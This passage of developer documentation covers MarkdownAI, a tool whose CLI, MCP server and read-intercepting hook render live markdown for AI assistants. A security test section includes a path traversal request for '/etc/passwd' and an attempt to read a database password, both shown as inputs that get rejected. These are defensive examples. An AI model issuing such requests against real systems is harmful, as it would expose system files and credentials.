It does not execute directives, register `@define` blocks, read included files, or make any network requests. The output is purely the result of syntax removal plus conditional branch selection. If you need rendered output with live data, use `mai render` instead.

<!-- /mdd-section: 29-stripper -->

<!-- mdd-section: 30-mcp-server -->
### MCP Server - AI Integration

The `@markdownai/mcp` package runs a Model Context Protocol server that sits between your AI tool and the filesystem. When an AI reads a `.md` file, the server checks for the `@markdownai` header and routes it through the engine instead of returning raw text. Plain markdown files pass through unchanged.

#### Starting the server

```bash
# Start in the current directory
mai serve

# Start against a specific project root
mai serve --cwd /path/to/project

# Use a custom port
mai serve --port 3000
```

Connect your AI tool (Claude, Cursor, etc.) to the running server using standard MCP configuration. From that point on, all file reads go through the server automatically.

#### What it enables

**Lazy phase loading** is the main reason to use the MCP server. A document with 20 phases never loads all 20 at once. The AI calls `resolve_phase` to load the active phase, works through it, then calls `next_phase` to advance. Completed phases are not reloaded. The AI's context window only ever contains what is needed right now.

**Live data on read** - directives like `@env`, `@db`, and `@http` are resolved at the moment the AI reads the file. The AI sees actual values, not directive syntax.

**Single DB connection per session** - the server connects to databases once at startup and reuses those connections for every `@db` call in the session.

#### Tools exposed to the AI

| Tool | What it does |
|------|--------------|
| `read_file(path)` | Read a file - routes MarkdownAI docs through the engine, passes plain files through |
| `resolve_phase(file, phase)` | Load and resolve a specific phase into context |
| `list_phases(file)` | Return the phase list and transition map from `@on complete` declarations |
| `next_phase(file, current_phase)` | Get the next phase based on `@on complete` transitions |
| `call_macro(file, macro, args?)` | Resolve a named macro with parameter substitution |
| `get_env(key, fallback?)` | Resolve an environment variable from the server's environment |
| `execute_directive(directive)` | Execute a single directive string and return the output |
| `invalidate_cache(file?, directive?)` | Drop session cache entries so the AI gets fresh data after a known change |

#### Phase sequencing

Phase order comes from `@on complete ->` declarations in the document. The `@graph` directive is for visualization only - the server never consults it for sequencing. If you want a phase to follow another, use `@on complete -> @phase <name>` in the source document.

#### Cache invalidation

If you update a data source mid-session (changed a config file, updated a database record), call `invalidate_cache` to tell the server to drop the relevant entries. The AI gets fresh values on the next read without needing a server restart.

<!-- /mdd-section: 30-mcp-server -->

<!-- mdd-section: 31-hook -->
### Hook — PreToolUse AI Routing

When an AI assistant reads a MarkdownAI document, the hook silently intercepts that read and routes the file through the MarkdownAI engine before the AI ever sees it. The AI receives fully resolved, live content — not raw source — without any change to how it works or what it asks for.

#### What It Does

MarkdownAI documents start with a special `@markdownai` marker. The hook watches every file read the AI performs: if the file is a plain `.md` file with no marker, it passes through untouched. If it finds the marker, it hands the file off to the MarkdownAI server, which executes any embedded data fetches, queries, or pipelines, then returns the resolved output. The AI receives that resolved content as if it had just read a normal file. The entire process is transparent — the AI never knows the hook is there.

#### How To Use It

Install the hook once using `mai init`. MarkdownAI will auto-detect your AI client and install the hook into its configuration. After that, no further action is needed — every `.md` file the AI opens is automatically checked and routed if it is a MarkdownAI document.

#### Commands

| Command | Description |
|---|---|
| `mai init` | Auto-detect your AI client and install the hook |
| `mai init --client claude-code` | Install the hook explicitly for Claude Code |
| `mai init --client cursor` | Install the hook explicitly for Cursor |

#### Examples

Install the hook with auto-detection:
```bash
mai init
```

After installation, open any MarkdownAI document in your AI session — resolved live data will appear automatically.

<!-- /mdd-section: 31-hook -->

<!-- mdd-section: 32-cli-complete -->
### CLI Complete — All Remaining mai Commands

The `mai` CLI gives you a complete toolkit for building, watching, serving, securing, and inspecting your live markdown documents. These commands handle everything from automatically re-rendering documents when you save changes to locking down which databases and shell commands your documents are allowed to access.

#### What It Does

The `mai` command-line tool covers the full lifecycle of a live document. You can build a document once and write it to disk, or keep a watch process running that automatically re-renders whenever you edit a source file. A built-in cache lets you inspect, seed, and clear stored data fetched by your documents. A security system lets you control exactly which shell commands, databases, and web domains your documents can reach. Diagnostic commands let you see at a glance what phases, macros, and imported files make up any given document.

#### How To Use It

Run any `mai` command followed by the document file you want to work with. Most commands accept universal flags — `--env` to load a specific environment file, `--verbose` for detailed output, `--strict` to treat warnings as errors, and `--silent` to suppress all output except security alerts and fatal errors.

#### Commands

| Command | Description | Flags |
|---------|-------------|-------|
| `mai build <file>` | Render a document and write it to disk | `-o, --output <path>` (required), `--watch` |
| `mai watch <file>` | Watch a document for changes and re-render automatically | `--output <path>` |
| `mai serve` | Start the MCP server | `--cwd <path>`, `--port <N>` |
| `mai strip <file>` | Strip live directives from a document, producing plain markdown | — |
| `mai cache show [file]` | Show cached data for a document or all documents | `--expired`, `--persist`, `--session` |
| `mai cache clear [file]` | Clear cached data | `--session`, `--persist`, `--directive <type>` |
| `mai cache seed <file>` | Pre-populate the cache by running a document's fetches | `--env <file>`, `--directive <type>` |
| `mai security init` | Create or import a security policy | `--from .markdownai.json` |
| `mai security show` | Display the active security policy | — |
| `mai security shell <subcommand>` | Manage allowed shell commands (`enable`, `disable`, `add`, `remove`, `list`, `test`) | — |
| `mai security db <subcommand>` | Manage database access rules (`add`, `set`, `allow-collection`, `deny-keyword`, `test`, `disable`) | — |
| `mai security http <subcommand>` | Manage allowed HTTP domains (`enable`, `disable`, `add-domain`, `remove-domain`, `test`) | — |
| `mai security filesystem <subcommand>` | Manage file access rules (`show`, `add-block-path`, `test`, `test-mask`) | — |
| `mai security audit <subcommand>` | View and manage the security audit log (`show`, `show --blocked`, `clear`) | — |
| `mai list-phases <file>` | List all phases in a document with their transitions | — |
| `mai list-macros <file>` | List all macros used in a document with their source file | — |
| `mai list-imports <file>` | Show the full dependency tree for a document | — |

#### Examples

Build a document and write the output to a file:
```bash
mai build report.md --output dist/report.md
```

Watch a document and continuously re-render it as you edit:
```bash
mai watch report.md --output dist/report.md
```

See what data is currently cached for a document:
```bash
mai cache show report.md
```

Inspect which external files a document depends on:
```bash
mai list-imports report.md
```

<!-- /mdd-section: 32-cli-complete -->

---

### Testing

<!-- mdd-section: 33-e2e-test-suite -->
### E2E Test Suite — Fixture Files and CLI Verification

The E2E Test Suite gives MarkdownAI a full-system confidence check by running realistic documents through the entire rendering pipeline and verifying the output is correct. It solves the problem of catching integration bugs — issues that only appear when all language features, the CLI, and the file resolver work together in a real document context.

#### What It Does

The suite includes a set of realistic MarkdownAI documents that use every major language feature: includes, imports, macros, conditionals, data reads, environment variables, phases, pipelines, and caching. These documents are processed end-to-end — from source through parsing, rendering, and output — and the results are automatically verified. The suite checks that every directive is resolved (nothing raw leaks through), that output is non-empty, that stripping removes all directives, that validation passes, and that the `mai` binary itself starts and completes successfully.

#### How To Use It

Run the E2E tests from the project root using the standard test command:

```bash
pnpm test --project e2e
```

This executes all fixture documents through the engine and reports any failures. No configuration is needed — the fixture files and data are bundled with the suite. To run a targeted subset of scenarios, use Vitest's filter flag:

```bash
pnpm test --project e2e -t "cache"
```

#### Examples

Run the full E2E suite:
```bash
pnpm test --project e2e
```

Run only the CLI binary smoke tests:
```bash
pnpm test --project e2e -t "cli binary"
```

Run only the error-case tests to verify security and error handling:
```bash
pnpm test --project e2e -t "error"
```

<!-- /mdd-section: 33-e2e-test-suite -->

---

### AI-Native Features

<!-- mdd-section: 34-ai-consumer-mode -->
### AI — Consumer-Targeted Conditional Rendering (planned — not yet implemented)

Write one document and let it speak differently to different audiences. With consumer-targeted rendering, the same MarkdownAI file can show concise, structured content when read by an AI agent and richer, human-friendly prose when opened in a browser — no duplicate documents, no manual editing.

#### What It Does

When you render a MarkdownAI document you tell `mai` who the audience is. Sections you have tagged with `@if consumer="ai"` appear only for AI consumers; sections tagged `@if consumer="human"` appear only for human readers. Everything else renders for both. This lets you maintain a single source of truth while producing perfectly tailored output for each audience at render time.

#### How To Use It

Tag sections in your document using the `@if` / `@endif` block syntax, then pass `--consumer` when you render:

1. Open your `.md` document and wrap audience-specific content in conditional blocks.
2. Run `mai render` with the `--consumer` flag to produce output for the intended audience.

#### Commands

| Command | Description |
|---|---|
| `mai render <file> --consumer=ai` | Render the document for an AI consumer |
| `mai render <file> --consumer=human` | Render the document for a human reader |
| `mai render <file>` | Render without a consumer — all `@if consumer=` blocks evaluate to false |

#### Examples

**Basic AI vs. human split:**
```
@if consumer="ai"
**Status:** operational | uptime: 99.97% | last_incident: none
@endif

@if consumer="human"
## Service Status

Everything is running smoothly. No incidents in the past 30 days.
@endif
```

**Rendering for an AI agent:**
```bash
mai render status.md --consumer=ai
```

<!-- /mdd-section: 34-ai-consumer-mode -->

<!-- mdd-section: 35-ai-prompt -->
### AI - @prompt Directive (planned - not yet implemented)

The `@prompt` directive lets you embed instructions for AI readers directly inside a MarkdownAI document. Think of it as a way to annotate a document with context that AI tools should know when reading it - without cluttering the human-readable content.

**Syntax**

```
@prompt [role="<role>"]
  Your instructions here.
@end
```

The `role` attribute is optional and defaults to `context`. Valid roles are:

- `context` - background information the AI should keep in mind
- `constraint` - rules the AI must follow when processing the document
- `calibration` - guidance on tone, style, or behavior
- `instruction` - explicit directions for what the AI should do

**How it renders**

The output depends on the `consumer` setting.

When `consumer="ai"`, the block renders as a structured instruction prefix:

```
[AI INSTRUCTION - context]
When reading this document, note that all API endpoints require an Authorization header.
[/AI INSTRUCTION]
```

When `consumer="human"` (or when `consumer` is not set), the block renders as a styled info callout:

```
> **Note:** When reading this document, note that all API endpoints require an Authorization header.
```

The safe default - no `consumer` set - behaves like `human`. This means a document with `@prompt` blocks is always readable and never silently drops content.

**Rules**

- `@prompt` blocks are always rendered. They are never hidden from either consumer type.
- You can use multiple `@prompt` blocks in a single document.
- Blocks cannot be nested inside each other.
- `@prompt` works inside `@define`/`@call` blocks and `@if` blocks.
- `mai strip` removes `@prompt` blocks entirely, so stripped output contains no AI instructions.
- When the MCP server renders a document with `consumer="ai"`, `@prompt` blocks appear in AI form.

**Example**

```
@markdownai v1.0

@prompt role="constraint"
  Never suggest modifying the authentication flow. It is audited and locked.
@end

@prompt role="context"
  This document covers the v2 API only. v1 endpoints were deprecated in March.
@end

## API Reference

...
```

An AI reading this document via the MCP server will see both instruction blocks prepended in structured form before the main content. A human opening the rendered document sees them as callout notes. Either way, nothing is hidden.

<!-- /mdd-section: 35-ai-prompt -->

<!-- mdd-section: 36-ai-context-budget -->
### AI - Context Budget and Section Priority (planned - not yet implemented)

Three directives work together to give you control over how your document behaves when an AI reads it: `@section` marks how important a block of content is, `@chunk-boundary` tells RAG systems where to split the document, and `--budget` on the render command enforces a token limit by dropping low-priority content first.

**Why this matters**

When you feed a long document to an AI, something gets cut. Without priority hints, the AI or the context window just truncates from the end - your conclusion disappears, your critical warnings vanish. With `@section`, you decide what survives.

For RAG pipelines, splitting on paragraph breaks or arbitrary character counts produces chunks with broken context. `@chunk-boundary` lets you declare the splits at logical boundaries you define, so each chunk stands on its own.

**Marking section priority**

```markdown
@markdownai v1.0

@section id="overview" priority="critical"
  ## What This Does

  This document describes the deployment process for production.
  Read this section before doing anything else.
@end

@section id="background" priority="low"
  ## Historical Context

  This process evolved from the 2019 manual deployment approach...
@end

@section id="steps" priority="high"
  ## Deployment Steps

  1. Run the pre-flight checks
  2. Tag the release
  3. Trigger the pipeline
@end
```

Priority levels from highest to lowest:

- `critical` - never dropped, regardless of budget
- `high` - dropped only after all `low` and `medium` sections are exhausted
- `medium` - the default when no priority is specified
- `low` - dropped first when the budget gets tight

Content that lives outside any `@section` block is treated as `critical` - it will never be dropped.

**Rendering with a budget**

```bash
# Enforce a 4,000 token budget
mai render guide.md --budget=4000

# Budget + AI-optimized output combined
mai render guide.md --budget=4000 --consumer=ai
```

The budget pass runs after the document is fully rendered. Sections are whole units - the engine never cuts a section halfway through. When a section gets dropped, standard output replaces it with `[Section omitted - budget N tokens]`. In AI output mode (`--consumer=ai`), sections are dropped silently with no notice marker.

Token count is estimated as `Math.ceil(characterCount / 4)`. If you have no `--budget` flag, `@section` has no visible effect - the markers disappear and content renders normally.

**Declaring chunk boundaries for RAG**

```markdown
@markdownai v1.0

## Introduction
This guide covers the full setup process.

@chunk-boundary id="install-section" standalone="true"

## Installation

Install the package and configure your environment.

@chunk-boundary id="config-section"

## Configuration

Set your environment variables before starting the server.
```

In standard output, `@chunk-boundary` renders as an HTML comment (`<!-- chunk: install-section -->`), invisible in the final document. In AI output mode, it renders as `---chunk:install-section---` inline, where AI parsers can detect it.

The `standalone="true"` attribute is a metadata hint to the RAG system that the following chunk makes sense on its own, without surrounding document context.

**Generating a chunk map**

```bash
mai render guide.md --chunk-map
```

This emits a sidecar JSON file alongside the output (`<output>.chunks.json`) listing each chunk boundary and its position in the rendered output. Feed this to your RAG ingestion pipeline to split the document at the right places.

<!-- /mdd-section: 36-ai-context-budget -->

<!-- mdd-section: 37-ai-concepts -->
### AI - @define-concept Inline Glossary (planned - not yet implemented)

When you use an AI tool to read a document that references domain-specific terms, the AI fills in gaps with its training data. For a term like `jailRoot`, that means it might guess - and guess wrong. `@define-concept` fixes this by letting you register exact definitions inline, right where the term is introduced.

**Single-line form:**

```
@define-concept jailRoot "the document root directory used to confine file access"
```

**Block form (for longer definitions):**

```
@define-concept strict-mode
  When --strict is active, any warning becomes a fatal error that halts rendering.
@end
```

Both forms register the concept in the document's glossary. What happens at render time depends on the `consumer` setting.

#### How consumer controls output

When `consumer=ai`, all concepts collected from the document are injected as a structured glossary block at the top of the rendered output:

```markdown
## Glossary
**jailRoot** - the document root directory used to confine file access
**strict-mode** - when --strict is active, any warning becomes a fatal error
---
```

This gives an AI reader the vocabulary it needs before it encounters those terms in context. The AI no longer has to infer what your project means by a term - it already has the definition.

When `consumer=human` or no consumer is set, the concept renders in-place as a definition at the point it appears in the document:

```markdown
**jailRoot** - the document root directory used to confine file access
```

No glossary block is generated. The definition sits where you put it.

#### Rules

- **Duplicate names:** if you define the same concept twice, the last definition wins and a `WARN` is logged
- **Ordering:** concepts appear in the AI glossary in document order (insertion order)
- **Inside macros:** a concept defined inside `@define`/`@call` is registered when the macro is called, not when it is defined
- **Stripping:** `mai strip` removes all `@define-concept` directives from output
- **Interpolation:** once defined, you can reference a concept value directly using `{{ concept.jailRoot }}`

#### Why this matters

AI hallucination on domain terms is a real problem in technical documentation. A term like `strict-mode` means something specific in your project - but an AI reader has no way to know that without being told. `@define-concept` makes the vocabulary explicit in a machine-readable way, without cluttering the document for human readers. The AI glossary is only injected when the consumer is actually an AI.

<!-- /mdd-section: 37-ai-concepts -->

<!-- mdd-section: 38-ai-constraints -->
### AI - @constraint Directive (planned - not yet implemented)

`@constraint` lets you embed machine-readable rules directly in a document. Each rule gets a stable ID and a severity level, so AI tools can query the full constraint registry via MCP and verify code against those rules - without parsing prose.

**Syntax**

```
@constraint id="no-raw-sql" severity="critical"
NEVER pass user input directly to a database query. Always use parameterized queries.
@end
```

The `id` attribute is required - it's the stable slug used for programmatic reference. `severity` defaults to `"high"` if omitted.

**Severity levels**

| Level | Meaning |
|-------|---------|
| `critical` | Absolute prohibition - AI tools treat this as a hard rule |
| `high` | Strong rule; violations point to bugs or security issues |
| `medium` | Design preference; violations are worth flagging |
| `low` | Style or convention |

**How it renders**

Rendering depends on the consumer target.

For AI consumers (`consumer="ai"`), constraints are pulled to the top of the document as a table:

```markdown
## Constraints
| ID | Severity | Rule |
|----|----------|------|
| no-raw-sql | CRITICAL | NEVER pass user input directly... |
```

For human readers (`consumer="human"` or unset), each constraint renders in-place as a blockquote:

```markdown
> **CONSTRAINT [no-raw-sql] - CRITICAL**
> NEVER pass user input directly to a database query.
```

**MCP integration**

The new `get_constraints` MCP tool returns the full constraint registry for a document as structured JSON. This is the main payoff - an AI tool reading your codebase can call `get_constraints` on any MarkdownAI document and get back every rule with its ID and severity, ready to check against the code it's reviewing.

**Ordering and validation**

Constraints render in severity order (critical first), then by insertion order within each severity tier. If the same `id` appears twice, the second definition overwrites the first and a warning is logged.

Run `mai validate` to list all constraint IDs and their severity levels across the document. `mai strip` removes `@constraint` blocks from output.

<!-- /mdd-section: 38-ai-constraints -->

<!-- mdd-section: 39-ai-format -->
### AI — Token-Efficient Format Mode (`--format=ai`) (planned — not yet implemented)

When AI tools read your documents, they pay a cost in tokens for every decorative element that adds no information. `--format=ai` automatically strips that chrome — horizontal rules, redundant blank lines, standalone bold labels — and compresses the output so AI readers receive the same meaning in significantly fewer tokens.

#### What It Does

When you render a document with `--format=ai`, MarkdownAI runs a post-render compression pass over the output. Decorative separators, trailing whitespace, and purely visual emphasis are removed. Everything that carries real information — headings, code blocks, tables, lists, links, blockquotes, and AI instruction blocks — is kept intact. The result is valid markdown that can be 15–40% smaller in token count. The MCP server uses this mode by default whenever an AI tool requests a document.

#### How To Use It

Pass `--format=ai` to the `render` or `build` command. Use `--tables=kv` alongside it to also convert simple two-column tables into compact key-value pairs, which saves roughly 40% more tokens on those tables.

#### Commands

| Command | Description |
|---|---|
| `mai render <file> --format=ai` | Render and apply AI compression |
| `mai render <file> --format=standard` | Render without compression (explicit default) |
| `mai render <file> --format=ai --tables=kv` | Render with compression and 2-column table conversion |
| `mai build <file> --format=ai -o out.md` | Build and write compressed output to a file |

#### Examples

Render a document for an AI consumer:
```
mai render docs/api-reference.md --format=ai
```

Render with maximum compression:
```
mai render docs/changelog.md --format=ai --tables=kv
```

<!-- /mdd-section: 39-ai-format -->

<!-- mdd-section: 40-ai-e2e-accuracy -->
### AI — E2E Accuracy Tests and Format Benchmarks (planned — not yet implemented)

This feature provides a comprehensive end-to-end test suite that verifies every AI-native capability in MarkdownAI works correctly together. It also measures and reports how much token overhead the AI-optimized output format removes compared to standard rendering.

#### What It Does

When you run the AI test suite, it exercises all six AI-native features — consumer targeting, prompt instructions, context budgeting, concepts and constraints, and the AI format filter — using a set of purpose-built fixture documents. Each test confirms that the right content appears for the right audience (AI vs. human), that no raw directives leak into the final output, and that critical sections are never dropped regardless of budget constraints. After the accuracy tests pass, the suite runs a benchmark pass and writes a human-readable report showing exactly how many tokens were saved by using the AI format.

#### How To Use It

Run the AI end-to-end tests using:

```bash
mai test --suite=ai
```

#### Examples

Run the full AI test suite:
```bash
mai test --suite=ai
```

Inspect the benchmark report after tests pass:
```
e2e/benchmarks/ai-format-report.md
```

<!-- /mdd-section: 40-ai-e2e-accuracy -->

---

### MCP End-to-End

<!-- mdd-section: 41-mcp-e2e-protocol -->
### MCP E2E — Protocol Conformance

MarkdownAI exposes a Model Context Protocol (MCP) server that AI assistants and other tools connect to. This feature ensures that server speaks the MCP protocol correctly — that the handshake works, tools are advertised properly, and errors come back as clean error messages rather than crashes.

#### What It Does

When `mai serve` starts, it waits for clients to connect and communicate over a standard JSON-RPC protocol. This feature verifies the full conversation between a client and the server from start to finish: the initial handshake that establishes the connection, the listing of all available tools with their proper descriptions and input requirements, the dispatching of tool calls to the right handlers, and the correct handling of bad requests (unknown tools, missing parameters, malformed messages). The goal is to guarantee that any MCP-compatible client — including AI assistants like Claude — can connect to a MarkdownAI server and get predictable, well-formed responses every time.

#### How To Use It

This feature operates automatically in the background. As a user, what you benefit from is a reliable `mai serve` command. When you start the MCP server and connect an AI assistant to it, you can trust that:

1. The server completes the handshake and announces itself as `markdownai`.
2. The tool list (`tools/list`) returns all 8 built-in tools with correct schemas.
3. If you send a request for a tool that does not exist, you get a proper error response — not a crash.
4. If you send a malformed message, the server recovers and keeps running.
5. When you disconnect, the server shuts down cleanly with no lingering processes.

#### Examples

Start the MCP server:

```bash
mai serve
```

A well-formed handshake looks like:

```json
// Client sends:
{ "jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {} }

// Server responds with:
{ "jsonrpc": "2.0", "id": 1, "result": { "protocolVersion": "...", "serverInfo": { "name": "markdownai" }, "capabilities": { "tools": {} } } }
```

<!-- /mdd-section: 41-mcp-e2e-protocol -->

<!-- mdd-section: 42-mcp-e2e-tools -->
### MCP E2E — All 8 Tools End-to-End (planned — not yet implemented)

MarkdownAI exposes a set of tools that AI assistants like Claude can call directly while working inside your documents. This feature validates that all eight of those tools behave correctly — from reading files and navigating document phases to running macros, fetching environment variables, and clearing cached output.

#### What It Does

When Claude (or another AI) opens a MarkdownAI document, it can call built-in tools to interact with the document's structure and data. These tools let an AI read rendered content, move through multi-phase documents step by step, invoke reusable macros, look up environment values, execute individual directives, and reset cached results.

The eight tools available are:

- **read_file** — reads and renders a MarkdownAI document, expanding all directives
- **list_phases** — lists all phases defined in a document and their allowed transitions
- **resolve_phase** — renders the content of a specific named phase
- **next_phase** — returns the name of the phase that follows the current one
- **call_macro** — runs a named macro defined in a document, optionally passing parameters
- **get_env** — retrieves an environment variable by name, with an optional fallback value
- **execute_directive** — runs a single MarkdownAI directive and returns its output
- **invalidate_cache** — clears cached rendered output for a specific file or all files

#### Examples

Resolving a specific phase in a document:
```
resolve_phase({ file: "onboarding.md", phase: "setup" })
```

Calling a macro with a parameter:
```
call_macro({ file: "report-template.md", macro: "summary-block", args: { period: "Q1 2026" } })
```

Clearing the session cache for a single file after its source data changes:
```
invalidate_cache({ file: "live-metrics.md" })
```

<!-- /mdd-section: 42-mcp-e2e-tools -->

<!-- mdd-section: 43-mcp-e2e-security -->
### MCP E2E — Security Enforcement at MCP Boundary (planned — not yet implemented)

MarkdownAI enforces strict security rules at its MCP interface — the layer that AI assistants like Claude use to interact with your documents. This feature verifies that malicious or misconfigured requests cannot access files outside your project, expose credentials from your environment, or inject harmful directives through that interface.

#### What It Does

When an AI tool communicates with MarkdownAI over MCP, every request passes through a security checkpoint before anything happens. The security layer blocks attempts to read files outside your document folder (path traversal attacks), prevents sensitive environment variables like passwords and API keys from leaking in responses, and sanitizes directives to stop injection attacks. Critically, the server stays running even after it receives a malicious request — a single bad call cannot crash or hang your session.

The protections apply to all four operations exposed via MCP:

1. **File reads** — only files inside your project's document root can be read; paths attempting to escape are rejected.
2. **Phase resolution** — file arguments are validated the same way before any phase is resolved.
3. **Environment variable access** — keys matching credential patterns are blocked; safe keys like `NODE_ENV` and `PATH` pass through normally.
4. **Directives and macros** — shell-injection sequences and credential references in directive text are blocked.

#### Examples

```
# A path traversal attempt — rejected, server stays alive
read_file({ path: "../../../etc/passwd" })
→ error: path outside document root

# A credential key — blocked, value never appears in the response
get_env({ key: "MONGO_PASSWORD" })
→ error: key matches credential filter
```

<!-- /mdd-section: 43-mcp-e2e-security -->

<!-- mdd-section: 44-mcp-e2e-ai-integration -->
### MCP E2E — AI-Native Integration and Realistic Claude Workflow (planned — not yet implemented)

MarkdownAI documents are "AI-native" — they carry built-in instructions, glossary terms, and safety constraints that AI assistants like Claude can read directly through the MCP interface. This feature ensures that when an AI opens a MarkdownAI document, it receives a compact, pre-filtered view of the document rather than raw markdown, and can query the document's constraints and phases step-by-step.

#### What It Does

When an AI assistant connects to a MarkdownAI project via the MCP server, every document it reads is automatically delivered in AI format: token-efficient, with decorative noise removed, inline glossary definitions surfaced at the top, and `@prompt` instruction blocks rendered as clearly labeled AI instructions. The AI can also ask the document for its constraint list — rules like "never use eval()" — sorted by severity. Documents that model multi-phase workflows expose each phase independently, letting an AI walk through implementation, review, and other stages in order without loading the entire document at once.

#### How To Use It

This feature works automatically when an AI assistant connects to the MCP server. The key behaviors are:

1. **Open a document via MCP** — the AI receives a shorter, filtered version of the document by default.
2. **Control how much context the AI receives** — pass a `budget` value (in tokens) to `read_file`.
3. **Query document constraints** — use the `get_constraints` tool with a file path.
4. **Walk document phases** — use `list_phases`, `resolve_phase`, and `next_phase` in sequence.

#### Commands

| Tool | Description |
|---|---|
| `read_file` | Read a document in AI format (default) or standard format. Accepts an optional `budget`. |
| `get_constraints` | Return all `@constraint` blocks from a document, sorted by severity (critical first). |
| `list_phases` | List all phases defined in a document and their allowed transitions. |
| `resolve_phase` | Render a specific named phase in AI format. |
| `next_phase` | Return the name of the next phase after a given phase, or null if it is the last. |
| `invalidate_cache` | Clear the cached render for a file so the next read reflects any changes. |

#### Examples

Read with a token budget — drops low-priority sections to fit within the limit:
```
read_file({ path: "architecture.md", budget: 50 })
```

Retrieve all safety constraints from a document:
```
get_constraints({ file: "architecture.md" })
// Returns: [{ id: "no-eval", severity: "critical", body: "..." }, ...]
```

Walk a two-phase workflow from start to finish:
```
list_phases({ file: "pipeline.md" })
resolve_phase({ file: "pipeline.md", phase: "implementation" })
next_phase({ file: "pipeline.md", phase: "implementation" })
// → "review"
resolve_phase({ file: "pipeline.md", phase: "review" })
next_phase({ file: "pipeline.md", phase: "review" })
// → null
```

<!-- /mdd-section: 44-mcp-e2e-ai-integration -->

<!-- mdd-section: 45-mdd-markdownai-integration -->
### MDD + MarkdownAI Integration

MDD and MarkdownAI were built for each other. MDD is a workflow that enforces "document first" development - every feature is written down before any code is written, and those documents stay authoritative throughout the project. MarkdownAI makes documents execute. The integration closes the loop: MDD's own artifacts stop being static files that drift, and start being live documents that reflect the actual state of the project every time they render.

This document is a discovery map of all the places where that integration pays off.

#### What It Does

Ten concrete improvement areas were identified when analyzing MDD's current static-markdown architecture against what MarkdownAI can do:

**Live session context.** `.mdd/.startup.md` can have a `@markdownai` header and query its own data on render - current branch, feature counts by status, last audit summary, recent commits. A pre-session hook runs `mai render .mdd/.startup.md` before Claude is invoked. Claude always enters the session with accurate project state, not whatever `.startup.md` said last week.

**Live dependency graph.** `.mdd/connections.md` - the path tree and Mermaid dependency diagram - can be rendered by `mai render` instead of rebuilt by Claude. No more "rebuild connections" step after every doc change. Add `mai validate .mdd/connections.md` to CI and broken `depends_on` references surface automatically.

**Self-verifying feature docs.** A feature doc that says `status: complete` can include a live section that checks whether its `source_files` actually exist and whether typecheck passes. `mai render .mdd/docs/05-lang-header.md` shows the current truth, not the truth at doc-writing time.

**Executable ops runbooks.** Add `@phase` blocks to ops runbooks and they become self-validating procedures. Pre-flight failures stop before deployment happens. Health checks show actual HTTP responses. `@env required` prevents running a deploy without credentials set.

**Live audit reports.** Embed `@include` references pointing at the actual source lines in each finding. When a bug is fixed, re-rendering the audit report shows the fix in place - no new audit run needed to confirm.

**Mode files as live documents.** The branch guard, bootstrap check, and connections rebuild logic that appear across all MDD mode files become `@define` macros in a shared `@import`ed library. Every occurrence becomes `@call branch-guard` - one change propagates everywhere.

**MCP phase navigation.** Mode file phases (`@phase understand`, `@phase document`, etc.) become trackable by the `mai-serve` MCP server. After context compaction, Claude calls `list_phases` and immediately knows which phase was active. No repeated work, no re-asking answered questions.

#### How To Use It

The quick wins require no new MarkdownAI features - they use directives already in Waves 1-2:

1. Add `@markdownai` to `.mdd/.startup.md` and configure the pre-session hook to run `mai render` before Claude is invoked.
2. Add `@markdownai` to `.mdd/connections.md` and replace the Claude rebuild with `mai render`.
3. Add `@include source_file lines=N-M` references to existing audit reports so findings show current code.
4. Bootstrap new projects with a live `.startup.md` template that already has `@markdownai` - no `(unknown)` placeholders.

For larger investments: convert MDD mode files to use `@define`/`@import` macros (requires the mddv2 initiative), then add `@phase` blocks and MCP integration for phase-state persistence across context compaction.

#### The Philosophical Payoff

MDD enforces "document first." MarkdownAI enforces "documentation that cannot lie." Applied to MDD's own artifacts, the combination means: the workflow tool itself is managed by its own principles. A `.startup.md` rendered from live queries cannot be stale. A `connections.md` built by `mai render` cannot reference a doc that doesn't exist.

<!-- /mdd-section: 45-mdd-markdownai-integration -->

<!-- mdd-section: 46-mdd-token-optimization-analysis -->
### MDD Token Economics and Accuracy Analysis

A concrete, numbers-based analysis of what happens when MDD mode files are converted to use MarkdownAI. Measured from the actual codebase.

#### What It Does

The current MDD system loads approximately 10,234 tokens per session (the router file plus the active mode file plus `.startup.md`). The content breaks down as roughly 37% narrative prose - explanations of why rules exist, written for human readers. Claude doesn't need the why; it needs the what and when.

**Token savings by transformation:**

| Approach | Savings per session |
|----------|---------------------|
| `@define` macros (branch guard, connections, startup) | ~840 tokens |
| `@if` conditional sections (greenfield skip, type gates) | ~400-780 tokens |
| Live `.startup.md` replacing mid-session re-reads | ~750 tokens |
| `@consumer=ai` narrative stripping (Wave 5) | ~1,416 tokens |
| `@phase` lazy loading via MCP (only active phase visible) | ~3,000-5,000 tokens |

Conservative optimization (macros + conditionals + live startup): **~19-23% reduction** from baseline.
With narrative stripping: **~35% reduction**.
Full optimization with MCP phase loading: **~64-84% reduction**.

The MCP phase-loading estimate is wide because it depends on session length. A full Phase 1-7 build compresses the most; a quick `/mdd status` call barely changes.

#### Accuracy Improvements

Token savings matter, but the accuracy case is more important.

**Attention dilution.** In a current mdd-build.md Phase 6 session, the "5 iterations max, then STOP" rule is buried at line 540 of 780 within a conversation that may be 40,000-70,000 tokens long. With `@phase` lazy loading, Phase 6 instructions are at the top of context when Phase 6 begins. Specific rule compliance improves by an estimated 20-35%.

**Stale context errors.** A `.startup.md` that is days or weeks old causes real mistakes: Claude suggests rebuilding a feature that is already complete, auto-branches incorrectly because the branch field is wrong, tries to re-apply fixes that were already applied. With live `.startup.md`, this error class is fully eliminated.

**Prose rules vs structured constraints.** Rules written as narrative paragraphs compete with other context and get missed. Rules written as `@constraint` blocks, rendered with Wave 5's AI format mode, become machine-readable and consistently applied.

**Phase confusion after context compaction.** Long MDD sessions (a full Phase 1-7 build) frequently hit context compaction. Without MCP phase tracking, Claude re-reads the mode file and may re-execute completed phases. With `mai-serve` persisting phase state, one MCP call re-orients. Estimated 80-90% reduction in phase-confusion rework.

**Audit resolution cost.** For a report with 20 findings, having `@include source_file lines=N-M` embedded in each finding saves approximately 8,000-16,000 tokens in the audit resolution session - Claude sees the current code inline rather than doing separate file reads for each finding.

#### Examples

Before - branch guard as prose (63 lines in mdd-build.md):
```
Before creating or modifying any files, run:
  BRANCH=$(git branch --show-current)
  DIRTY=$(git status --porcelain)
[... 60 more lines explaining each scenario ...]
```

After - branch guard as MarkdownAI (12 lines, executes):
```markdown
@query git branch --show-current
@query git status --porcelain
@if {{ branch }} == "main"
  @if {{ dirty }} != ""
    @constraint STOP - uncommitted changes on {{ branch }}. Choose: (a) commit (b) stash (c) abort
  @else
    @constraint Run: git checkout -b feat/{{ slug }}
  @endif
@endif
